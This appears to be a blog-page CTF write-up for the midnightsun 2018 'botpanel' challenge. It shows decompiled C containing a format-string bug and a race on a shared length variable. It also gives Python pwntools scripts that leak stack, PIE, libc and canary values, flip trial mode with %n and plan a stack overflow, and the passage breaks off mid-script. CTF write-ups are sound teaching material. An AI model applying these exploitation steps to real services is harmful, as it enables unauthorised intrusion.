@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>midnightsun CTF 2018 - botpanel | kileak</title>
+
+
+
+
+
+<meta name="description" content="midnightsun CTF 2018 - botpanel">
+
+
+<meta name="keywords" content="midnightsun">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2018/midnight-botpanel/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">midnightsun CTF 2018 - botpanel</h1>
+      <p class="post-meta">Apr 15, 2018</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>midnightsun CTF 2018 - botpanel
+<!--break--></p>
+
+  <p>These cyber criminals are selling shells like hot cakes off thier new site. Pwn their botpanel for us so we can stop them</p>
+
+  <p>Solves: 19</p>
+
+  <p>Service: nc pwn.midnightsunctf.se 31337</p>
+
+  <p>Author: likvidera</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/botpanel/botpanel_e0117db42051bbbe6a9c5db571c45588">botpanel</a> <a href="https://kileak.github.io/assets/botpanel/libc.so">libc</a> <a href="https://kileak.github.io/assets/botpanel/xpl.py">xpl.py</a> <a href="https://kileak.github.io/assets/botpanel/server.py">server.py</a> <a href="https://kileak.github.io/assets/botpanel/server2.py">server2.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : FULL</code></pre></figure>
+
+<p>Botpanel acts as a management panel for botnets, in which we could also invite friends, if we own a registered version.</p>
+
+<p>So, let’s take a look at it:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">                          ▄▄▄▄▄                            
+                             ▄ ▄▄                           
+                           ▄ ▄ ▄ ▄                          
+                           ▀▄  ▄  ▄                         
+                                   ▄                        
+                                 ▀▄                         
+                                    ▄                       
+                                                            
+                                                            
+                                 ▄▄                         
+                              ▄▄      ▄▄                    
+                    ▄▄      ▄▄ ▄▄       ▄▄▄                 
+                   ▄▄▄▄▄ ▄▄▄▄▄  ▄▄         ▄                
+                      ▄▄▄    ▄▄       ▄  ▄ ▄                
+                      ▄   ▄▄▄▄       ▄▀   ▀▀                
+                  ▀▄ ▄▄ ▄ ▄▄▄▄▄▄▄▄ ▄▄▄                      
+                     ▄ ▄▄ ▄▄   ▄▄▄ ▄▀                       
+                     ▄▄▄▄   ▄▄ ▄   ▀                        
+                   ▄▄▄ ▄▀▀  ▄ ▄▄  ▄                         
+                   ▀▀▀▀    ▀▀▀▄▄▄▄▀                         
+                              ▄▄▄▀                          
+                                                            
+  ▄▄ $1337 SHELLS ▄▄                           ▄▄ $2 CCs! ▄▄                                                  
+ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ BOT PANEL LOGIN ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+
+
+        Panel password: notrealpw!! 
+
+MENU [TRIAL MODE]
+ 1) Show available bots
+ 2) Send invite
+ 3) Send feedback
+ 4) Quit
+&gt; 2
+Invites not allowed in Trial-mode, send some Bitcoins for full-access!</code></pre></figure>
+
+<p>We can use the password from the provided config, if running locally, but obviously it won’t be the correct password for the remote service.</p>
+
+<p>Also this <code class="language-plaintext highlighter-rouge">[TRIAL MODE]</code> doesn’t look right. Thus, first, we have to:</p>
+
+<ul>
+  <li>find the correct password for the remote service</li>
+  <li>change trial mode to registered mode</li>
+</ul>
+
+<p>Let’s take a look at the login handling</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">login</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">server_pw</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">conf</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
+    <span class="kt">int</span> <span class="n">tries</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">12</span><span class="p">);</span>
+
+    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n\t\t</span><span class="s">Panel password: "</span><span class="p">);</span>
+        <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">12</span><span class="p">);</span>
+        <span class="n">remove_newline</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+        <span class="n">len_pw</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">server_pw</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strncmp</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">server_pw</span><span class="p">,</span> <span class="n">len_pw</span><span class="p">))</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t\t\x1B</span><span class="s">[31mIncorrect!</span><span class="se">\x1B</span><span class="s">[0m %d attempts left</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">--</span><span class="n">tries</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t\t</span><span class="s">Your attempt was: "</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>         <span class="c1">// Format string vuln</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">tries</span> <span class="p">)</span>
+            <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="n">conf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'T'</span> <span class="p">)</span>
+        <span class="n">trial_mode</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>  
+<span class="p">}</span></code></pre></figure>
+
+<p>There’s a pretty obvious format string vulnerability in the login handler, which can be used to leak some stuff. We won’t be able to do “much” more than leaking with it, since the format string is limited to 12 characters, which just isn’t enought to do arbitrary writes.</p>
+
+<p>But we’ll try to make the most out of it.</p>
+
+<p>When doing format string exploits, I mostly just start with a little scanner, showing me the pointer and content of every format string parameter.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">scan</span><span class="p">():</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"output.1"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f1</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">200</span><span class="p">):</span>
+            <span class="k">try</span> <span class="p">:</span>
+                <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s">"./botpanel_e0117db42051bbbe6a9c5db571c45588"</span><span class="p">,</span> <span class="s">"1000"</span><span class="p">])</span>
+                
+                <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"password: "</span><span class="p">,</span> <span class="s">"AAAA%%%d$p"</span> <span class="o">%</span> <span class="n">i</span><span class="p">)</span>
+                <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"was: "</span><span class="p">)</span>
+                <span class="n">LEAK</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
+
+                <span class="n">f1</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"%d =&gt; %s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">LEAK</span><span class="p">))</span>
+            <span class="k">except</span><span class="p">:</span>
+                <span class="k">pass</span>
+            <span class="k">finally</span><span class="p">:</span>
+                <span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span></code></pre></figure>
+
+<p>This will write an output file, which we can use to check, what to use for leaking</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0 =&gt; AAAA%0$p
+1 =&gt; AAAA0x4
+2 =&gt; AAAA0xb
+3 =&gt; AAAA0x565560c0   &lt;== PIE leak
+4 =&gt; AAAA0x5655b008
+5 =&gt; AAAA0xffffd5a0   &lt;== STACK leak
+6 =&gt; AAAA0xffffd5a0
+7 =&gt; AAAA0xffffd5a8
+8 =&gt; AAAA0xf7e54347   &lt;== LIBC leak
+9 =&gt; AAAA0xf7fa8000
+10 =&gt; AAAA0x4
+11 =&gt; AAAA(nil)
+12 =&gt; AAAA0x41414141   &lt;== Format String
+13 =&gt; AAAA0x24333125
+14 =&gt; AAAA0x70
+15 =&gt; AAAA0xee025500   &lt;== Canary
+16 =&gt; AAAA0xf7fa8000
+17 =&gt; AAAA0x56559f64
+18 =&gt; AAAA0xffffd5c8
+19 =&gt; AAAA0x56556403
+20 =&gt; AAAA0xffffd5a8
+21 =&gt; AAAA0xffffd5a0</code></pre></figure>
+
+<p>We could now check the other addresses with gdb, but for getting a quick overview we just replace the format string send with</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"password: "</span><span class="p">,</span> <span class="s">"AAAA%%%d$s"</span> <span class="o">%</span> <span class="n">i</span><span class="p">)</span></code></pre></figure>
+
+<p>and get</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0 =&gt; AAAA%0$s
+3 =&gt; AAAAÃ¤&gt;
+4 =&gt; AAAAˆ$­ûu±UVv±UVh±UVh±UVh±UVh±UVh±UVhÁUV
+5 =&gt; AAAA:T
+6 =&gt; AAAA:T
+7 =&gt; AAAAnotrealpw!!
+8 =&gt; AAAAÃ¹&lt;
+9 =&gt; AAAA°
+11 =&gt; AAAA(null)
+16 =&gt; AAAA°
+17 =&gt; AAAA|N
+18 =&gt; AAAA
+19 =&gt; AAAAƒÄèØýÿÿ¸
+20 =&gt; AAAAnotrealpw!!        &lt;== Password
+21 =&gt; AAAA:T
+23 =&gt; AAAAˆ$­ûu±UVv±UVh±UVh±UVh±UVh±UVh±UVhÁUV
+24 =&gt; AAAA./botpanel_e0117db42051bbbe6a9c5db571c45588</code></pre></figure>
+
+<p>Without any real effort, we now have every leak at hand, we could possible need to exploit this any further.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"> 
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak stack / pie / libc"</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"password: "</span><span class="p">,</span> <span class="s">"%3$p%5$p%8$p"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"was: "</span><span class="p">)</span>
+    <span class="n">LEAK</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
+    <span class="n">PIE</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">LEAK</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">10</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="n">STACK</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">LEAK</span><span class="p">[</span><span class="mi">10</span><span class="p">:</span><span class="mi">20</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="n">LIBC</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">LEAK</span><span class="p">[</span><span class="mi">20</span><span class="p">:</span><span class="mi">30</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"PIE leak         : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PIE</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"STACK leak       : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">STACK</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC leak        : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBC</span><span class="p">))</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak canary"</span><span class="p">)</span>
+    
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"password: "</span><span class="p">,</span> <span class="s">"%15$p"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"was: "</span><span class="p">)</span>
+    <span class="n">CANARY</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"CANARY           : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">CANARY</span><span class="p">))</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[+] Starting local process './botpanel_e0117db42051bbbe6a9c5db571c45588': pid 2680
+[2680]
+[*] Paused (press any to continue)
+[*] Leak stack / pie / libc
+[*] PIE leak         : 0x565560c0
+[*] STACK leak       : 0xffffdde0
+[*] LIBC leak        : 0xf7e7d817
+[*] CANARY           : 0x3c94e300</code></pre></figure>
+
+<p>For getting the server password, just send <code class="language-plaintext highlighter-rouge">%20$s</code> and note it somewhere. Since the password will not change, we don’t need to waste a try on retrieving it again and again.</p>
+
+<p>Going through the binary at first, it might seem, as everything’s fine, every buffer is only read with a correct size, so no overflows will happen. There’s just this <code class="language-plaintext highlighter-rouge">invite-mode</code>, that’s only accessible when we’re not in trial mode. It will let you enter an IP and a port, starting a new thread, connecting to the specified machine and show them a menu, in which they can only send a feedback in the end.</p>
+
+<p>Before getting into the feedback handling, we should find a way to get into registered mode.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">if</span> <span class="p">(</span> <span class="n">conf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'T'</span> <span class="p">)</span>
+        <span class="n">trial_mode</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>  </code></pre></figure>
+
+<p>So, if <code class="language-plaintext highlighter-rouge">conf[1]</code> isn’t <code class="language-plaintext highlighter-rouge">T</code> we’ll be out of trial mode. Well, though we cannot do much writing with our format string vuln from login, writing one single null byte is possible. Also, if you check where <code class="language-plaintext highlighter-rouge">config</code> is stored, you’ll see that it is accessable by the 5th format string parameter, so getting into registered mode boils down to just</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Set registered mode"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"password: "</span><span class="p">,</span> <span class="s">"%5$n"</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">LOCAL</span><span class="p">:</span>
+    <span class="n">PW</span> <span class="o">=</span> <span class="s">"notrealpw!!"</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">PW</span> <span class="o">=</span> <span class="s">"&gt;@!ADMIN!@&lt;"</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Do real login"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"password: "</span><span class="p">,</span> <span class="n">PW</span><span class="p">)</span>
+    
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] Paused (press any to continue)
+[*] Leak stack / pie / libc
+[*] PIE leak         : 0x565560c0
+[*] STACK leak       : 0xffffdde0
+[*] LIBC leak        : 0xf7e7d817
+[*] Leak canary
+[*] CANARY           : 0x8f4dd500
+[*] Set registered mode
+[*] Do real login
+[*] Switching to interactive mode
+
+MENU [REGISTERED MODE]
+ 1) Show available bots
+ 2) Send invite
+ 3) Send feedback
+ 4) Quit</code></pre></figure>
+
+<p>We can now invite other clients, which will let the service connect back to the specified machine:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">connectback</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ip</span><span class="p">,</span> <span class="kt">int</span> <span class="n">port</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">pthread_t</span><span class="o">*</span> <span class="n">th</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">sockaddr</span> <span class="n">addr</span><span class="p">;</span>
+
+    <span class="p">...</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="n">connect</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="mh">0x10u</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Failed to send invite to that IP! Disconnecting ..."</span><span class="p">);</span>
+      <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="n">g_con_num</span> <span class="o">&gt;</span> <span class="mi">1u</span> <span class="p">)</span>                <span class="c1">// Maximum of 2 clients allowed</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Maximum invites sent!"</span><span class="p">);</span>
+  
+    <span class="o">++</span><span class="n">g_con_num</span><span class="p">;</span>
+    
+    <span class="n">th</span> <span class="o">=</span> <span class="p">(</span><span class="n">pthread_t</span> <span class="o">*</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="n">g_con</span><span class="p">[</span><span class="n">g_con_num</span><span class="p">]</span> <span class="o">=</span> <span class="n">fd</span><span class="p">;</span>
+
+    <span class="n">pthread_create</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">g_thread_attr</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">))</span><span class="n">invite_handler</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">g_con</span><span class="p">[</span><span class="n">g_con_num</span><span class="p">]);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>With this, we can invite a maximum of two other clients to the botpanel. After connecting, this will create a thread handling the clients. In <code class="language-plaintext highlighter-rouge">invite_handler</code> it will show them another menu, in which they can send feedback back to the service.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">feedback_len</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">send_feedback</span><span class="p">(</span><span class="kt">int</span> <span class="n">socket_fd</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">answer</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
+
+  <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">50</span><span class="p">);</span>
+  
+  <span class="n">sendstr</span><span class="p">(</span><span class="n">socket_fd</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">Feedback length: "</span><span class="p">);</span>
+  <span class="n">feedback_len</span> <span class="o">=</span> <span class="n">get_int</span><span class="p">(</span><span class="n">socket_fd</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">feedback_len</span> <span class="o">&lt;=</span> <span class="mi">50</span><span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">sendstr</span><span class="p">(</span><span class="n">socket_fd</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">Feedback: "</span><span class="p">);</span>
+
+    <span class="n">recv_until</span><span class="p">(</span><span class="n">socket_fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">feedback_len</span><span class="p">,</span> <span class="sc">'\n'</span><span class="p">);</span>
+    <span class="n">sendstr</span><span class="p">(</span><span class="n">socket_fd</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">Edit feedback y/n?: "</span><span class="p">);</span>
+    <span class="n">recv_until</span><span class="p">(</span><span class="n">socket_fd</span><span class="p">,</span> <span class="n">answer</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="sc">'\n'</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="n">answer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'y'</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">sendstr</span><span class="p">(</span><span class="n">socket_fd</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">Feedback: "</span><span class="p">);</span>
+      <span class="n">recv_until</span><span class="p">(</span><span class="n">socket_fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">feedback_len</span><span class="p">,</span> <span class="sc">'\n'</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">sendstr</span><span class="p">(</span><span class="n">socket_fd</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">Feedback length is incorrect!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="p">}</span>  
+<span class="p">}</span></code></pre></figure>
+
+<p>At first, this looks ok. The binary checks, that a valid feedback length is specified, before it will read to the feedback buffer, so nothing bad should happen.</p>
+
+<p>But then again, <code class="language-plaintext highlighter-rouge">feedback_len</code> is a global variable and every client is running in a thread. Thus, <code class="language-plaintext highlighter-rouge">feedback_len</code> is shared over all threads, and one client changing this variable will also effect other clients.</p>
+
+<p>Short attack plan:</p>
+
+<ul>
+  <li>Invite client 1</li>
+  <li>Invite client 2</li>
+  <li>Client 2 starts sending feedback
+    <ul>
+      <li>Specify a valid feedback length, getting into <code class="language-plaintext highlighter-rouge">edit</code> mode</li>
+      <li>Write some short feedback</li>
+      <li>Wait on the question <code class="language-plaintext highlighter-rouge">Edit feedback</code></li>
+    </ul>
+  </li>
+  <li>Client 1 start sending feedback
+    <ul>
+      <li>Specify a feedback length of 2000</li>
+      <li>Getting an error, that length would be invalid (but <code class="language-plaintext highlighter-rouge">feedback_len</code> is now 2000)</li>
+    </ul>
+  </li>
+  <li>Back to client 2
+    <ul>
+      <li>Answer <code class="language-plaintext highlighter-rouge">yes</code> to <code class="language-plaintext highlighter-rouge">Edit feedback</code></li>
+      <li>Client 2 can now send 2000 bytes into <code class="language-plaintext highlighter-rouge">buffer</code>, easily smashing it</li>
+    </ul>
+  </li>
+</ul>
+
+<p>I wrote three scripts for those tasks. In hindsight, it would have been even easier to just handle all three connections in one script, but well, ctf time ;)</p>
+
+<ul>
+  <li>Main exploit, connecting to the service, doing leaks and inviting the other two clients</li>
+  <li>Server 1, waiting for connection</li>
+  <li>Server 2, waiting for connection, doing a ropchain to execute a command in the thread of the main exploit</li>
+</ul>
+
+<p>Main Exploit</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">sendinvite</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"IP:"</span><span class="p">,</span> <span class="n">ip</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Port:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak stack / pie / libc"</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"password: "</span><span class="p">,</span> <span class="s">"%3$p%5$p%8$p"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"was: "</span><span class="p">)</span>
+    <span class="n">LEAK</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
+    <span class="n">PIE</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">LEAK</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">10</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="n">STACK</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">LEAK</span><span class="p">[</span><span class="mi">10</span><span class="p">:</span><span class="mi">20</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="n">LIBC</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">LEAK</span><span class="p">[</span><span class="mi">20</span><span class="p">:</span><span class="mi">30</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"PIE leak         : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PIE</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"STACK leak       : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">STACK</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC leak        : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBC</span><span class="p">))</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak canary"</span><span class="p">)</span>
+
